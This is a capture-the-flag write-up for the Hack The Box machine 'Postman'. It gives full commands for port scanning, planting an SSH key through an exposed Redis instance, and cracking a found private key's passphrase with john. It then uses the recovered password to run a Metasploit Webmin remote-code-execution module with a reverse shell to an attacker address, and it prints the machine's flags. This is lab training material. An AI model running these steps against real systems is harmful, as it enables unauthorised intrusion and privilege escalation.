# POSTMAN

## NMAP

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/postman]
└─$ nmap 10.10.10.160   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-15 05:23 EDT
Nmap scan report for 10.10.10.160
Host is up (0.30s latency).
Not shown: 994 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
6379/tcp  open     redis
10000/tcp open     snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 62.32 seconds
                                                                                          
┌──(kali㉿kali)-[~/Downloads/hackthebox/postman]
└─$ nmap 10.10.10.160 -p 22,80,1277,9050,9485,10000 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-15 05:25 EDT
Nmap scan report for 10.10.10.160
Host is up (0.32s latency).

PORT      STATE  SERVICE   VERSION
22/tcp    open   ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open   http      Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp open  redis   Redis key-value store 4.0.9
10000/tcp open   http      MiniServ 1.910 (Webmin httpd)
|_http-server-header: MiniServ/1.910
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.62 seconds
```

## PORT 80

### GOBUSTER

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/postman]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.160 -t100 -x .txt,.jpg,.php -q
/.hta.jpg             (Status: 403) [Size: 295]
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd.jpg        (Status: 403) [Size: 300]
/.hta.php             (Status: 403) [Size: 295]
/.htpasswd.php        (Status: 403) [Size: 300]
/.htaccess.txt        (Status: 403) [Size: 300]
/.htpasswd            (Status: 403) [Size: 296]
/.htaccess.jpg        (Status: 403) [Size: 300]
/.hta                 (Status: 403) [Size: 291]
/.htaccess.php        (Status: 403) [Size: 300]
/.htpasswd.txt        (Status: 403) [Size: 300]
/.hta.txt             (Status: 403) [Size: 295]
/css                  (Status: 301) [Size: 310] [--> http://10.10.10.160/css/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.10.160/fonts/]
/images               (Status: 301) [Size: 313] [--> http://10.10.10.160/images/]
/index.html           (Status: 200) [Size: 3844]                                 
/js                   (Status: 301) [Size: 309] [--> http://10.10.10.160/js/]    
/server-status        (Status: 403) [Size: 300]                                  
/upload               (Status: 301) [Size: 313] [--> http://10.10.10.160/upload/]
```
Looking through these directories I did not find anything interesrting

## PORT 10000

### WEBPAGE

![](https://github.com/Leo-2807/Writeups/blob/main/images/postman.png)

## PORT 6379

I used this [cheatsheet](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis) to enumerate redis 

### SSH

Making a ssh key on our system
```
ssh-keygen -t rsa
```

Writting the public key to a file
```
(echo -e "\n\n"; cat ./id_rsa.pub; echo -e "\n\n") > ssh.txt
```

Importing the file to redis

```
cat ssh.txt | redis-cli -h 10.10.10.160 -x set crackit
```

Then we run redis-cli and make our file a authorised key

```
redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh/
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```

And now we can SSH into it

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/postman]
└─$ ssh -i id_rsa redis@10.10.10.160
The authenticity of host '10.10.10.160 (10.10.10.160)' can't be established.
ECDSA key fingerprint is SHA256:kea9iwskZTAT66U8yNRQiTa6t35LX8p0jOpTfvgeCh0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.160' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$ whoami
redis
```

## USER.TXT

While I was enumerating through the system I found something in the ```/opt``` directory

```
redis@Postman:~/.ssh$ cd /opt
redis@Postman:/opt$ ls -la
total 12
drwxr-xr-x  2 root root 4096 Sep 11  2019 .
drwxr-xr-x 22 root root 4096 Sep 30  2020 ..
-rwxr-xr-x  1 Matt Matt 1743 Aug 26  2019 id_rsa.bak
redis@Postman:/opt$ cat id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```
We got matt's ssh key

Using john to find the passphrase 

```
┌──(kali㉿kali)-[~/Downloads/hackthebox]
└─$ python ssh2john.py postman/matt_rsa >> postman/matt_rsa.txt                       
                                                                                          
┌──(kali㉿kali)-[~/Downloads/hackthebox]
└─$ cd postman
                                                                                          
┌──(kali㉿kali)-[~/Downloads/hackthebox/postman]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt matt_rsa.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (postman/matt_rsa)
1g 0:00:00:15 DONE (2021-08-15 07:30) 0.06506g/s 933096p/s 933096c/s 933096C/sa6_123..heartbleedbelievethehype
Session completed
```
I try to ssh into the machine as matt
```
┌──(kali㉿kali)-[~/Downloads/hackthebox/postman]
└─$ ssh -i matt_rsa matt@10.10.10.160                                               
Enter passphrase for key 'matt_rsa': 
Connection closed by 10.10.10.160 port 22
```

So we cannot ssh into the machine 
After trying some things I trie ```su``` command with password ```computer2008```

```
redis@Postman:/opt$ su Matt
Password: 
Matt@Postman:/opt$ whoami
Matt
```

```
Matt@Postman:/opt$ cd /home/Matt
Matt@Postman:~$ cat user.txt
2645a1cc9defa4b72e03eb27c69c2a25
```

## ROOT.TXT

After trying some things and not getting any way to escalate our privelges I thought back to the webmin login that we had on port 10000

I used the credentials of user matt to login into webmin on port 10000

Now I ran metasploit to search for some vulnerbility that we can exploit 

```
msf6 > search webmin

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution                                                                                                                                             
   3  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE                                                                                                                                                             
   4  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access                                                                                                                         
   5  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor                                                                                                                                                         


Interact with a module by name or index. For example info 5, use 5 or use exploit/linux/http/webmin_backdoor                                                                                                                                                                      

msf6 > use 2
[*] Using configured payload cmd/unix/reverse_perl
msf6 exploit(linux/http/webmin_packageup_rce) > options

Module options (exploit/linux/http/webmin_packageup_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:ho
                                         st:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or h
                                         osts file with syntax 'file:<path>'
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME                    yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin <= 1.910


msf6 exploit(linux/http/webmin_packageup_rce) > set PASSWORD computer2008
PASSWORD => computer2008
msf6 exploit(linux/http/webmin_packageup_rce) > set LHOST 10.10.14.8
LHOST => 10.10.14.8
msf6 exploit(linux/http/webmin_packageup_rce) > set TARGETURI /
TARGETURI => /
msf6 exploit(linux/http/webmin_packageup_rce) > set RHOST https://postman
RHOST => https://postman
msf6 exploit(linux/http/webmin_packageup_rce) > set USERNAME Matt
USERNAME => Matt
msf6 exploit(linux/http/webmin_packageup_rce) > exploit

[-] Exploit failed: One or more options failed to validate: RHOSTS.
[*] Exploit completed, but no session was created.
msf6 exploit(linux/http/webmin_packageup_rce) > set RHOST 10.10.10.160
RHOST => 10.10.10.160
msf6 exploit(linux/http/webmin_packageup_rce) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf6 exploit(linux/http/webmin_packageup_rce) > exploit
```

And we are root

```
whoami
whoami
root
root@Postman:/usr/share/webmin/package-updates/# cd /root
cd /root
root@Postman:~# cat root.txt
cat root.txt
796dc6898146b52350845bc349e0b00d
```